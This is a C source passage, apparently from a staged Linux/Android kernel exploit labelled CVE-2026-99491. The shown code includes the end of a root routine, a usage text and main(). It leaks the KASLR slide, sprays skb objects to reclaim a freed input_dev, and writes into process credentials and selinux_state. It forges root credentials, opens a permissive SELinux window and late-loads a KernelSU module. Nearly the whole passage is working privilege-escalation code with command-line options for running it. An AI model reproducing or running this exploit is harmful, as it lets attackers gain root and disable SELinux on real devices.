     * acceptance to the uid-2000 parent after late-load returns. */
    setenv("CVE99491_SKIP_SU_CHECK", "1", 1);
    if (write(go, "K", 1) != 1) {
        printf("[-] direct root: could not trigger child late-load\n");
        goto fail;
    }
    for (int t = 0; t < 600 && !live; t++) {
        live = direct_read_module_live();
        if (!live)
            usleep(50000);
    }
    if (!live) {
        printf("[-] direct root: kernelsu not Live after 30s\n");
        goto fail;
    }
    printf("MODULE_LOADED\n");

    /* restore Enforcing through the same direct word (enforcing=0x0e!=0) */
    if (selinux_enforce_now() != 1)
        (void)direct_enforce_window(sel, o, 0);
    printf("[f] module_live=1 enforce=%d\n", selinux_enforce_now() == 1 ? 1 : 0);
    if (selinux_enforce_now() != 1)
        goto fail;
    if (waitpid(child, &status, 0) != child)
        printf("[!] late-load child wait failed\n");
    child = -1;
    printf("[*] module_live=1 enforce=1 late_load_rc=%d\n",
           WIFEXITED(status) ? WEXITSTATUS(status) : -1);
    if (port_su_check() != 0)
        goto fail;
    goto done;

fail:
    printf("[-] direct root failed\n");
    printf("PARKED\n");
    if (window)
        (void)direct_enforce_window(sel, o, 0);
    direct_child_kill(&child, &go, &st);
    return 1;
done:
    direct_child_kill(&child, &go, &st);
    spray_drain();
    printf("[!] direct engine complete: reboot required (PARKED marker set)\n");
    return 0;
}

static void usage(FILE *out, const char *p)
{
    fprintf(out,
        "usage: %s [--stage=STAGE] [--no-ksu] [--profile PATH] [--workdir PATH]\n"
        "          [--spray N] [--spread N MS] [--cpu N] [--force-fire]\n"
        "          [--ksud PATH] [--manager PKG] [--pm-backend=MODE]\n"
        "          [--self-test] [--version] [-h]\n"
        "\n"
        "CVE-2026-99491 real_cred chain (lhasa port).  Only real_cred is a\n"
        "supported mode; --mode=tracefs/no-tracefs is rejected by this port.\n"
        "\n"
        "STAGES (default full):\n"
        "  leak      profile check + KASLR anchor leak only; never fires the UAF\n"
        "            and never writes the PARKED marker\n"
        "  oracle    UAF fired, verified reclaim only; no kernel write at all\n"
        "  write     bootstrap + task identity verify + one 8-byte write into\n"
        "            our own cred cap_effective (uid/euid untouched)\n"
        "  selinux   permissive window opened through the chain and restored;\n"
        "            no module load\n"
        "  trigger   5.15-style direct-vals probe: one fixed SYN zero word onto\n"
        "            selinux_state through the reclaimed input_dev; prints\n"
        "            TRIGGER_PROBE_OK/FAIL + getenforce before/after (parks)\n"
        "  cred      DIRECT engine: tracefs cred leak + euid oracle only\n"
        "            (marks PARKED; prints CRED_ORACLE_OK)\n"
        "  root      DIRECT engine: cred + fsuid0 + CAP_SYS_MODULE + permissive\n"
        "            window + ksud late-load + su acceptance (reboot after)\n"
        "  full      complete chain: forged cred + setcon + ksud late-load +\n"
        "            su acceptance check\n"
        "\n"
        "  --profile PATH  flat JSON kernel profile (default %s;\n"
        "                  missing implicit file falls back to the compiled-in\n"
        "                  profile, an explicit path stays fail-closed)\n"
        "  --workdir PATH  workdir override (default from profile)\n"
        "  --ksud PATH     ksud loader override (asset); profile ksu_backend\n"
        "                  auto|asset|manager decides the order\n"
        "  --no-ksu        stop at the uid-0 shell; do not run ksud late-load\n"
        "  --spray N       skb spray count (profile default unless given)\n"
        "  --spread N MS   spray count and spread window\n"
        "  --cpu N         pinned CPU (0..7)\n"
        "  --force-fire    bypass the one-fire-per-boot RUN guard\n"
        "                  (a PARKED boot always refuses)\n"
        "  --self-test     profile/parser sanity only; no kernel access\n"
        "  --version       print build profile release and sha256\n"
        "  --manager PKG   manager package, or a short name:\n"
        "                  finasu|next|bakasu|sukisu|yukisu|sukisu_nova\n"
        "  --pm-backend=MODE  PackageManager backend: auto|pm|binder\n"
        "                     (default auto; auto/pm never use binder)\n"
        "\n"
        "Markers (machine contract, see plant/99491/README.md):\n"
        "  [p] profile_ok release=...   [p] anchor slide=0x...\n"
        "  [+] swap uid=0               [+] cred == real_cred\n"
        "  [+] setcon                   MODULE_LOADED\n"
        "  [f] module_live=1 enforce=1  [f] su_check=uid=0 ... u:r=ksu:s0\n"
        "  PARKED (aborted/armed boot; reboot required)\n"
        "\n"
        "Exit: 0 success, 1 chain/stage failure or PARKED, 2 usage, 3 profile.\n"
        "Env: CVE99491_PROFILE, CVE99491_WORKDIR, CVE99491_STAGE,\n"
        "     CVE99491_PM_BACKEND, CVE99491_KSU_LIB, CVE99491_KSU_BACKEND,\n"
        "     CVE99491_EXEC_CMD, CVE99491_KEEP_PERMISSIVE, CVE99491_TIMING,\n"
        "     CVE99491_SETTLE_MS, CVE99491_ORACLE_ONLY, CVE99491_ANCHOR_ONLY,\n"
        "     CVE99491_CHAIN_DEBUG, CVE99491_TRIGGER_MODE\n"
        "DIRECT engine stages (cred/root) use fixed-word UAF writes; see\n"
        "/root/workspace/_xring and docs 5.15 reference for the word recipes.\n",
        p, CVE99491_PROFILE_DEFAULT);
}

int main(int argc, char **argv) {
    const char *mode_name = "real_cred";
    const char *stage_name = NULL;
    const char *cli_pm_backend = NULL;
    const char *cli_ksud = NULL;
    const char *profile_path = NULL;
    const char *cli_workdir = NULL;
    const char *cli_manager = NULL;
    const char *env;
    const char *workdir;
    char profbuf[256];
    char perr[256];
    long spray_n = 0, spread_ms = 0;
    int spray_given = 0, spread_given = 0, cpu_given = 0;
    int cpu = 0;
    int mode = MODE_REAL_CRED;
    int internal = 0; /* 1 = wait child, 2 = late-load, 3 = late-su */
    int self_test = 0;
    int profile_explicit = 0;
    int profile_is_builtin = 0;
    int i;

    /* Non-exploit tracefs probe: create one touch UHID and read kmalloc
     * records for its input_dev allocation.  No pad, no UAF, no markers. */
    if (argc > 1 && !strcmp(argv[1], "trace-probe"))
        return trace_probe();

    /* Reclaim timing measurement: no pad report, no UAF walk, no markers. */
    if (argc > 1 && !strcmp(argv[1], "reclaim-probe"))
        return reclaim_probe(argc, argv);

    if (argc > 1 && !strcmp(argv[1], "ksud-probe"))
        internal = 4;
    else if (argc > 1 && !strcmp(argv[1], "wait"))
        internal = 1;
    else if (argc > 1 && !strcmp(argv[1], "late-load"))
        internal = 2;

    if (internal == 0 || internal == 4) {
        for (i = (internal == 4) ? 2 : 1; i < argc; i++) {
            if (!strcmp(argv[i], "--mode") && i + 1 < argc)
                mode_name = argv[++i];
            else if (!strncmp(argv[i], "--mode=", 7))
                mode_name = argv[i] + 7;
            else if (!strcmp(argv[i], "--profile") && i + 1 < argc)
                profile_path = argv[++i];
            else if (!strncmp(argv[i], "--profile=", 10))
                profile_path = argv[i] + 10;
            else if (!strcmp(argv[i], "--workdir") && i + 1 < argc)
                cli_workdir = argv[++i];
            else if (!strcmp(argv[i], "--manager") && i + 1 < argc)
                cli_manager = argv[++i];
            else if (!strncmp(argv[i], "--manager=", 10))
                cli_manager = argv[i] + 10;
            else if (!strcmp(argv[i], "--pm-backend") && i + 1 < argc)
                cli_pm_backend = argv[++i];
            else if (!strncmp(argv[i], "--pm-backend=", 13))
                cli_pm_backend = argv[i] + 13;
            else if (!strcmp(argv[i], "--stage") && i + 1 < argc)
                stage_name = argv[++i];
            else if (!strncmp(argv[i], "--stage=", 8))
                stage_name = argv[i] + 8;
            else if (!strcmp(argv[i], "--ksud") && i + 1 < argc)
                cli_ksud = argv[++i];
            else if (!strncmp(argv[i], "--ksud=", 7))
                cli_ksud = argv[i] + 7;
            else if (!strcmp(argv[i], "--self-test"))
                self_test = 1;
            else if (!strcmp(argv[i], "--version")) {
                printf("exp 99491-port release=%s profile_sha256=%s\n",
                       CVE99491_PROFILE_RELEASE, CVE99491_PROFILE_SHA256);
                return 0;
            } else if (!strcmp(argv[i], "-h") || !strcmp(argv[i], "--help")) {
                usage(stdout, argv[0]);
                return 0;
            } else if (!strcmp(argv[i], "--spray") && i + 1 < argc) {
                spray_n = atol(argv[++i]);
                spray_given = 1;
            } else if (!strcmp(argv[i], "--spread") && i + 2 < argc) {
                spray_n = atol(argv[++i]);
                spread_ms = atol(argv[++i]);
                spray_given = 1;
                spread_given = 1;
            } else if (!strcmp(argv[i], "--cpu") && i + 1 < argc) {
                cpu = atoi(argv[++i]);
                cpu_given = 1;
            } else if (!strcmp(argv[i], "--force-fire")) {
                g_force_fire = 1;
            } else if (!strcmp(argv[i], "--no-ksu")) {
                g_no_ksu = 1;
            } else {
                usage(stderr, argv[0]);
                return 2;
            }
        }
        if (!strcmp(mode_name, "real_cred"))
            mode = MODE_REAL_CRED;
        else if (!strcmp(mode_name, "tracefs") ||
                 !strcmp(mode_name, "no-tracefs")) {
            /* Dormant code paths: kept for reference, not reachable. */
            fprintf(stderr, "[-] --mode=%s is retained in source but disabled "
                    "in this port; only real_cred is a supported mode "
                    "(docs/99491-test-plan.md D1)\n", mode_name);
            return 2;
        } else {
            fprintf(stderr, "[-] unknown mode: %s\n", mode_name);
            usage(stderr, argv[0]);
            return 2;
        }
        /* --stage: default full; CVE99491_STAGE lets the App pass it too. */
        if (!stage_name || !*stage_name)
            stage_name = getenv("CVE99491_STAGE");
        if (!stage_name || !*stage_name)
            stage_name = "full";
        if (!strcmp(stage_name, "full")) {
            g_stage = STAGE_FULL;
        } else if (!strcmp(stage_name, "leak")) {
            g_stage = STAGE_LEAK;
        } else if (!strcmp(stage_name, "oracle")) {
            g_stage = STAGE_ORACLE;
        } else if (!strcmp(stage_name, "write")) {
            g_stage = STAGE_WRITE;
        } else if (!strcmp(stage_name, "selinux")) {
            g_stage = STAGE_SELINUX;
        } else if (!strcmp(stage_name, "trigger")) {
            g_stage = STAGE_TRIGGER;
        } else if (!strcmp(stage_name, "cred")) {
            g_stage = STAGE_CRED;
        } else if (!strcmp(stage_name, "root")) {
            g_stage = STAGE_ROOT;
        } else {
            fprintf(stderr, "[-] unknown --stage: %s "
                    "(use leak|oracle|write|selinux|trigger|cred|root|full)\n",
                    stage_name);
            return 2;
        }
        g_stage_name = stage_name;
        if (cli_ksud && *cli_ksud)
            setenv("CVE99491_KSU_LIB", cli_ksud, 1);
        if (g_stage != STAGE_FULL && g_stage != STAGE_CRED &&
            g_stage != STAGE_ROOT)
            g_no_ksu = 1; /* legacy staged gates never load the module */
        if (cpu < 0 || cpu > 7) {
            fprintf(stderr, "[-] --cpu must be 0..7\n");
            return 2;
        }
        if (spray_n < 0 || spread_ms < 0) {
            fprintf(stderr, "[-] --spray/--spread must be non-negative\n");
            return 2;
        }
    }

    {
        const char *pb = cli_pm_backend;
        const char *epb;

        if (!pb) {
            epb = getenv("CVE99491_PM_BACKEND");
            if (epb && *epb)
                pb = epb;
        }
        if (!pb)
            pb = "auto";
        if (strcmp(pb, "auto") && strcmp(pb, "pm") && strcmp(pb, "binder")) {
            fprintf(stderr, "[-] unknown --pm-backend: %s "
                    "(use auto|pm|binder)\n", pb);
            return 2;
        }
        setenv("CVE99491_PM_BACKEND", pb, 1);
    }

    /* --self-test: profile/parser sanity without touching the kernel.  Runs
     * on the host build too (no uname release match required). */
    if (self_test) {
        const char *stp = profile_path;
        int rc;

        if (!stp || !*stp) {
            stp = getenv(CVE99491_PROFILE_ENV);
            if (!stp || !*stp)
                stp = NULL;
        }
        if (stp)
            rc = profile_load(stp, &g_prof, perr, sizeof perr);
        else
            rc = profile_load_builtin(&g_prof, perr, sizeof perr);
        if (rc != 0) {
            printf("SELF_TEST_FAIL profile: %s\n", perr);
            return 1;
        }
        {
            int bad = 0;

            printf("self-test: release=%s arch=%s page=%u verified=%u "
                   "kaslr_align=%#x fields=%u\n", g_prof.release, g_prof.arch,
                   g_prof.page_size, g_prof.verified, g_prof.kaslr_align,
                   CVE99491_PROFILE_FIELD_COUNT);
            if (!is_kptr(SYM_UHID_WORKER) || !is_kptr(SYM_IHE_DEFAULT) ||
                !is_kptr(SYM_INJECT_EVENT) ||
                !is_kptr(SYM_SELINUX_STATE) || !is_kptr(INIT_CRED_ADDR) ||
                !is_kptr(SYM_PER_CPU_OFFSET) || !is_kptr(SYM_RUNQUEUES) ||
                !is_kptr(SYM_INPUT_DEV_LIST)) {
                printf("SELF_TEST_FAIL: non-canonical kernel symbol\n");
                bad = 1;
            }
            if (CAP_FULL != ((1ULL << (g_prof.cap_last_cap + 1)) - 1)) {
                printf("SELF_TEST_FAIL: cap_full_mask/cap_last_cap\n");
                bad = 1;
            }
            if (g_prof.cred_bytes > CVE99491_CRED_MAX ||
                g_prof.spray_pairs > CVE99491_SPRAY_PAIRS_MAX) {
                printf("SELF_TEST_FAIL: buffer ceiling\n");
                bad = 1;
            }
            if (g_prof.kaslr_align & (g_prof.kaslr_align - 1)) {
                printf("SELF_TEST_FAIL: kaslr_align\n");
                bad = 1;
            }
            ksu_derive_kmi();
            printf("self-test: kmi=%s backend=%s ksud=%s\n", g_ksud_kmi,
                   g_prof.ksu_backend, g_prof.ksu_ksud_path);
            if (g_prof.stext && (g_prof.stext >= g_prof.etext ||
                                 SYM_UHID_WORKER < g_prof.stext ||
                                 SYM_UHID_WORKER >= g_prof.etext)) {
                printf("SELF_TEST_FAIL: builtin stext/etext range\n");
                bad = 1;
            }
            if (bad)
                return 1;
        }
        printf("SELF_TEST_OK\n");
        return 0;
    }

    env = getenv(CVE99491_PROFILE_ENV);
    env = (env && *env) ? env : NULL;
    {
        const char *ew = getenv("CVE99491_WORKDIR");

        workdir = cli_workdir ? cli_workdir
                              : ((ew && *ew) ? ew : CVE99491_WORKDIR);
    }
    profile_explicit = (profile_path && *profile_path) || env != NULL;
    if (!profile_path || !*profile_path) {
        if (env) {
            profile_path = env;
        } else {
            snprintf(profbuf, sizeof(profbuf), "%s/profile.json", workdir);
            profile_path = profbuf;
        }
    }
    {
        struct stat pst;
        int builtin = 0;
        int rc;

        /* The compiled-in builtin profile (generated profile.h) is the
         * fallback ONLY for the implicit workdir path.  An explicit
         * --profile/env path must exist: fail-closed. */
        if (!profile_explicit && stat(profile_path, &pst) != 0)
            builtin = 1;
        if (builtin) {
            profile_is_builtin = 1;
            rc = profile_load_builtin(&g_prof, perr, sizeof perr);
            if (rc == 0)
                printf("[p] profile_source=builtin sha256=%s\n",
                       CVE99491_PROFILE_SHA256);
        } else {
            rc = profile_load(profile_path, &g_prof, perr, sizeof perr);
            if (rc == 0) {
                char berr[256];

                /* The runtime JSON and the compiled calibration must agree:
                 * the binary is rebuilt together with profile.h, so drift
                 * means a stale/foreign deploy. */
                if (profile_compare_builtin(&g_prof, berr, sizeof berr) != 0) {
                    printf("PROFILE_MISMATCH runtime-vs-builtin: %s\n", berr);
                    fprintf(stderr, "[-] rebuild exp with plant/99491/build.sh "
                            "whenever the profile JSON changes\n");
                    return 3;
                }
                printf("[p] profile_source=%s\n", profile_path);
            }
        }
        if (rc != 0) {
            printf("PROFILE_MISMATCH invalid: %s\n", perr);
            fprintf(stderr, "[-] profile %s: %s\n", profile_path, perr);
            return 3;
        }
    }
    /* KSU workdir/paths are device/manager-level defaults.  CLI and env
     * override them; both the profile values and the overrides must pass
     * the allowed-prefix checks. */
    if (cli_workdir || getenv("CVE99491_WORKDIR") != NULL) {
        if (profile_override_str(g_prof.ksu_workdir,
                                 sizeof(g_prof.ksu_workdir), workdir) != 0) {
            fprintf(stderr, "[-] invalid workdir: %s\n", workdir);
            return 2;
        }
    }
    {
        const char *mgr = cli_manager ? cli_manager
                                      : getenv("CVE99491_KSU_MANAGER");

        /* Same short names as the plant tool's manager_pkg(). */
        if (mgr && !strcmp(mgr, "finasu"))
            mgr = "me.yuki.fina";
        else if (mgr && !strcmp(mgr, "next"))
            mgr = "com.rifsxd.ksunext";
        else if (mgr && !strcmp(mgr, "bakasu"))
            mgr = "com.resukisu.resukisu";
        else if (mgr && !strcmp(mgr, "sukisu"))
            mgr = "com.sukisu.ultra";
        else if (mgr && !strcmp(mgr, "yukisu"))
            mgr = "org.rouyashiki.yukisu";
        else if (mgr && !strcmp(mgr, "sukisu_nova"))
            mgr = "com.sukisu.nova";
        if (mgr && *mgr &&
            profile_override_str(g_prof.ksu_manager,
                                 sizeof(g_prof.ksu_manager), mgr) != 0) {
            fprintf(stderr, "[-] invalid manager package: %s\n", mgr);
            return 2;
        }
    }
    if (profile_paths_validate(&g_prof, perr, sizeof perr) != 0) {
        fprintf(stderr, "[-] profile paths: %s\n", perr);
        return 2;
    }
    if (profile_check_runtime(&g_prof, perr, sizeof perr) != 0) {
        printf("PROFILE_MISMATCH runtime: %s\n", perr);
        fprintf(stderr, "[-] profile %s: %s (running kernel does not match the "
                "calibrated release; see docs/99491-test-plan.md §10)\n",
                profile_path, perr);
        return 3;
    }
    /* The in-place exec chain (`late-load`) re-reads the profile from the
     * environment; with the builtin profile there is no file to point at, so
     * the child falls back to its own builtin. */
    if (profile_is_builtin)
        unsetenv(CVE99491_PROFILE_ENV);
    else
        setenv(CVE99491_PROFILE_ENV, profile_path, 1);
    setenv("CVE99491_WORKDIR", g_prof.ksu_workdir, 1);

    setvbuf(stdout, NULL, _IONBF, 0);
    setvbuf(stderr, NULL, _IONBF, 0);
    signal(SIGPIPE, SIG_IGN);

    if (internal == 1)
        return wait_child_main();
    if (internal == 2)
        return ksu_late_load_main();
    if (internal == 4) {
        ksu_derive_kmi();
        if (ksu_locate_ksud() != 0) {
            printf("[-] no ksud for %s\n", g_prof.ksu_manager);
            return 1;
        }
        printf("[*] manager=%s kmi=%s\n[*] ksud=%s\n", g_prof.ksu_manager,
               g_ksud_kmi, g_ksud_lib);
        return 0;
    }

    run_paths_init(g_prof.ksu_workdir);
    mkdir(g_run_dir, 0755);

    /* Marker contract (docs/99491-test-plan.md §10 / plant/99491/README.md).
     * These exact lines are parsed by the App; details stay on stderr/PLOG. */
    printf("[p] profile_ok release=%s\n", g_prof.release);
    printf("[p] stage=%s mode=real_cred\n", g_stage_name);
    if (g_prof.verified != 1)
        fprintf(stderr, "[!] profile verified=0: calibration not "
                "release-approved (S6/S7 pending)\n");

    if (!spray_given)
        spray_n = g_prof.spray_count;
    if (!spread_given)
        spread_ms = g_prof.spray_spread_ms;
    if (!cpu_given)
        cpu = (int)g_prof.spray_cpu;

    if (mode == MODE_TRACEFS)
        fprintf(stderr, "[!] mode=tracefs is non-mainline (maintained; 2026-11-22 "
                "rework 5/5); --mode=real_cred is the default\n");
    else if (mode == MODE_NO_TRACEFS_FAKECRED)
        fprintf(stderr, "[!] mode=no-tracefs is non-mainline (maintained); "
                "its KSU path measured a 5/5 clean-boot block\n");

    printf("[*] profile=%s release=%s workdir=%s label=\"%s\" verified=%u\n",
           profile_path, g_prof.release, g_prof.ksu_workdir, g_prof.label,
           g_prof.verified);
    printf("[stats] mode=%s cpu=%d spray=%ld spread=%ld\n",
           mode_name, cpu, spray_n, spread_ms);
    g_proc_t0 = now_ms();
    {
        char tb[32];

        snprintf(tb, sizeof(tb), "%ld", g_proc_t0);
        setenv("CVE99491_T0", tb, 1);
    }
    /* Resolve the ksud loader while still an ordinary shell process: `pm path`
     * is reliable here, and the path is inherited across the in-place exec
     * chain.  Only --stage=full hands off to the module; staged gates stop
     * before any KSU work (plan D3). */
    if (g_stage == STAGE_FULL && !g_no_ksu && ksu_locate_ksud() == 0) {
        setenv("CVE99491_KSU_LIB", g_ksud_lib, 1);
        ksu_derive_kmi();
        if (getenv("CVE99491_EXEC_CMD") == NULL &&
            ksu_spawn_patch_helper() != 0)
            printf("[!] patch helper unavailable\n");
    }
    /* --stage=leak is read-only: it must not consume the one-fire-per-boot
     * budget nor write the PARKED marker.  Every later stage fires the UAF. */
    if (g_stage != STAGE_LEAK) {
        int gr = fire_guard();

        if (gr)
            return gr;
    } else {
        printf("[*] stage=leak: fire guard and PARKED marker skipped "
               "(read-only)\n");
    }

    /* Let the input subsystem settle after boot before creating anchors.
     * Only a cold boot needs the full wait: once userspace has been up for
     * a couple of minutes InputReader is idle and the anchors register on
     * the first try.  CVE99491_SETTLE_MS overrides the decision. */
    {
        const char *sm = getenv("CVE99491_SETTLE_MS");
        long settle;

        if (sm) {
            settle = strtol(sm, NULL, 0);
        } else {
            double up = 0;
            FILE *f = fopen("/proc/uptime", "r");

            if (f) {
                if (fscanf(f, "%lf", &up) != 1)
                    up = 0;
                fclose(f);
            }
            settle = up >= 45.0 ? 0 : 200;
        }
        if (settle > 0)
            usleep((useconds_t)settle * 1000);
    }
    PLOG("settle done\n");

    /* KASLR: worker.func low/high via throwaway anchors.  A failed evdev
     * registration is transient; retry the pair instead of aborting. */
    unsigned lo = 0, hi = 0;
    {
        int kal = 0;

        for (int attempt = 0; attempt < 5 && !kal; attempt++) {
            if (leak_word(IDX_WORKER_LO, &lo) == 0 &&
                leak_word(IDX_WORKER_HI, &hi) == 0)
                kal = 1;
            else
                usleep(20000);
        }
        if (!kal) {
            fprintf(stderr, "[-] KASLR leak failed\n");
            return 1;
        }
    }
    unsigned long long worker = ((unsigned long long)hi << 32) | lo;
    unsigned long long slide = worker - SYM_UHID_WORKER;
    /* Port: KASLR slide granularity and .text range are profile-driven
     * cross-checks, not hard-coded constants. */
    if (KASLR_ALIGN == 0 || (slide % (unsigned long long)KASLR_ALIGN) != 0) {
        printf("[-] slide %#llx is not %#x-byte aligned\n", slide,
               KASLR_ALIGN);
        return 1;
    }
    if (STEXT && ETEXT &&
        (worker < STEXT + slide || worker >= ETEXT + slide)) {
        printf("[-] worker.func %#llx outside runtime .text "
               "[%#llx,%#llx) slide=%#llx\n", worker, STEXT + slide,
               ETEXT + slide, slide);
        return 1;
    }
    printf("[+] worker.func = %#llx  slide = %#llx\n", worker, slide);
    printf("[p] anchor slide=0x%llx\n", slide);
    PLOG("kaslr slide=%#llx\n", slide);

    /* --stage=leak: profile check + KASLR anchor leak only.  No UAF, no
     * PARKED marker; the process exits before creating the host anchor. */
    if (g_stage == STAGE_LEAK) {
        printf("[+] leak stage complete (no UAF fired)\n");
        PLOG("leak stage complete\n");
        return 0;
    }

    /* --stage=cred/root: DIRECT fixed-word engine.  It needs no host anchor
     * and no persistent outq chain; slide is only used for selinux_state. */
    if (g_stage == STAGE_CRED || g_stage == STAGE_ROOT) {
        struct exp_opts od = {
            .cpu = cpu,
            .spray_n = spray_n,
            .spread_ms = spread_ms,
        };

        printf("[p] engine=direct\n");
        if (g_stage == STAGE_CRED)
            return run_direct_cred(&od);
        return run_direct_root(&od, slide);
    }

    /* Host anchor base.  The direct-map high word depends on the physical
     * 4 GB window, so both halves must come from the same slot.  kmalloc-16k
     * free slots are reused LIFO, which gives a verifiable chain:
     *   H1 -> LOW1, destroy
     *   E  -> HIGH  (E lands in H1's slot), destroy
     *   HOST -> LOW; LOW == LOW1 proves HOST reused the slot, so
     *   base = (HIGH:LOW) - uhid_waitq_self. */
    struct anchor a = { .fd = -1, .evfd = -1 };
    unsigned long long base = 0;
    int calibrated = 0;
    for (int attempt = 0; attempt < 20 && !calibrated; attempt++) {
        unsigned low1 = 0, high = 0, low2 = 0;
        if (leak_word(IDX_WAITQ_LO, &low1) < 0 ||
            leak_word(IDX_WAITQ_HI, &high) < 0) {
            fprintf(stderr, "[-] base calibration leak failed\n");
            continue;
        }
        if (anchor_create(&a, IDX_WAITQ_LO) < 0) {
            anchor_close(&a);
            continue;
        }
        if (leak_read(a.fd, a.evfd, NULL, 1, &low2) < 0) {
            fprintf(stderr, "[-] host self-leak failed\n");
            anchor_close(&a);
            continue;
        }
        if (low2 != low1) {
            printf("[-] slot reuse mismatch (host %#x != first %#x), retry\n",
                   low2, low1);
            anchor_close(&a);
            continue;
        }
        base = combine_base(low2, high);
        calibrated = (base & 0x3fff) == 0;
        printf("[+] host %s low=%#x high=%#x base=%#llx aligned=%s\n",
               a.node, low2, high, base, calibrated ? "yes" : "NO");
        PLOG("anchor base=%#llx\n", base);
        if (!calibrated) {
            anchor_close(&a);
            continue;
        }
    }
    if (!calibrated) {
        fprintf(stderr, "[-] could not calibrate host anchor base\n");
        return 1;
    }

    if (getenv("CVE99491_ANCHOR_ONLY")) {
        printf("[+] anchor-only stop base=%#llx slide=%#llx\n", base, slide);
        return 0;
    }
    struct exp_opts o = {
        .cpu = cpu,
        .spray_n = spray_n,
        .spread_ms = spread_ms,
    };
    /* --stage=oracle: the upstream oracle-only hook stops pchain_first right
     * after the verified reclaim, before any kernel write. */
    if (g_stage == STAGE_ORACLE)
        setenv("CVE99491_ORACLE_ONLY", "1", 1);
    /* --stage=trigger: pad-report -> reclaimed-dev fixed-word probe. */
    if (g_stage == STAGE_TRIGGER) {
        g_trigger_probe = 1;
        return run_trigger_probe(&a, base, slide, &o);
    }
    switch (mode) {
    case MODE_TRACEFS:
        return run_tracefs(&a, base, slide, &o);
    case MODE_NO_TRACEFS_FAKECRED:
        return run_no_tracefs_fakecred(&a, base, slide, &o);
    case MODE_REAL_CRED:
    default:
        return run_real_cred(&a, base, slide, &o);
    }
}
